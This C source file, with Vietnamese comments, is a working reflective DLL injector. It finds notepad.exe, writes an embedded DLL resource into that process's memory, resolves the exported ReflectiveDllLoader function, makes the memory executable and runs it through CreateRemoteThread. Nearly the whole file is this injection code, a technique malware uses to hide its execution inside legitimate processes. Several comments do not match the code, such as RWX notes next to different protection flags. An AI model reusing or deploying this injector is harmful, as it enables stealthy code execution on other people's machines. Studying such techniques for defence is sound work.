#include <windows.h>
#include <tlhelp32.h>
#include <strsafe.h>
#include "resource.h"  

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
	HANDLE ProcessHandle,
	UINT ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	);

struct PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	PVOID PebBaseAddress; // Đây là địa chỉ của PEB trong tiến trình mục tiêu
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;
	PVOID Reserved3;
};
DWORD RvaToOffset(PIMAGE_NT_HEADERS pNtHeaders, DWORD rva) { // offset trong section qua rva
	PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
	for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {
		if (rva >= pSection->VirtualAddress && rva < pSection->VirtualAddress + pSection->Misc.VirtualSize) {
			return rva - pSection->VirtualAddress + pSection->PointerToRawData;
		}
	}
	return 0; // RVA không hợp lệ hoặc nằm ngoài các section
}
int main()
{
	// tim targeted process
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(pe);

	DWORD pid = -1;
	if (Process32First(hSnapshot, &pe)) {
		do {
			if (lstrcmpiW(pe.szExeFile, L"notepad.exe") == 0) {
				pid = pe.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe));
	}
	if (pid == -1) return 0;
	CloseHandle(hSnapshot);
	//open target
	HANDLE hProc = OpenProcess(
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
		FALSE, pid
	);
	// doc dll
	HRSRC hRes = FindResourceW(
		NULL,
		MAKEINTRESOURCEW(IDR_SHELLCODE),   // ID do VS sinh
		RT_RCDATA                // Loại bạn đã đặt
	);

	if (!hRes) {
		return 1;
	}

	DWORD size = SizeofResource(NULL, hRes);
	HGLOBAL hData = LoadResource(NULL, hRes);
	if (hData == NULL)
		return 1;
	const BYTE* pReflectiveDll = (const BYTE*)LockResource(hData);
	if (pReflectiveDll == NULL)
		return 1;
	//cap phat bo nho
	LPVOID region1 = VirtualAllocEx(
		hProc,
		NULL,                       // để Windows chọn địa chỉ
		size,            // kích thước DLL thô
		MEM_COMMIT | MEM_RESERVE,   // commit + reserve
		PAGE_READWRITE      // RWX (cần thiết để chạy loader)
	);

	if (!region1) {
		return 1;
	}
	//ghi raw dll vao
	SIZE_T NumberOfBytesWritten;
	BOOL OK5 = WriteProcessMemory(
		hProc,
		region1,
		pReflectiveDll,
		size,
		&NumberOfBytesWritten
	);
	//tim RVA cua reflectiveloader trong dll
	// doc export table
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pReflectiveDll;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((LPBYTE)pReflectiveDll + dos->e_lfanew);
	IMAGE_DATA_DIRECTORY expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(pReflectiveDll + RvaToOffset(nt, expDir.VirtualAddress));

	DWORD* names = (DWORD*)(pReflectiveDll + RvaToOffset(nt, exports->AddressOfNames));
	WORD* ordinals = (WORD*)(pReflectiveDll + RvaToOffset(nt, exports->AddressOfNameOrdinals));
	DWORD* functions = (DWORD*)(pReflectiveDll + RvaToOffset(nt, exports->AddressOfFunctions));
	DWORD rva;
	const char* name;
	WORD ordinal;
	//fix th khong co rva
	for (DWORD i = 0; i < exports->NumberOfNames; i++) {
		name = (const char*)(pReflectiveDll + RvaToOffset(nt, names[i]));
		if (lstrcmpiA(name, "ReflectiveDllLoader") == 0) {
			// Tìm thấy!
			ordinal = ordinals[i];
			rva = functions[ordinal];
			break;
		}
	}

	//tao thread chay reflectiveloader
	LPVOID pReflectiveDllLoader = (LPVOID)((LPBYTE)region1 + RvaToOffset(nt, rva));
	DWORD oldProtect = 0;
	OK5 = VirtualProtectEx(
		hProc,
		region1,                       // để Windows chọn địa chỉ
		size,            // kích thước DLL thô
		PAGE_EXECUTE_READ,   // commit + reserve
		&oldProtect      // RWX (cần thiết để chạy loader)
	);
	DWORD threadId;
	HANDLE hThread = CreateRemoteThread(
		hProc,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)pReflectiveDllLoader,  // ← địa chỉ ReflectiveLoader
		NULL,
		0,
		&threadId
	);

	if (!hThread)
		return 1;	
	CloseHandle(hThread);
	return 0;
}
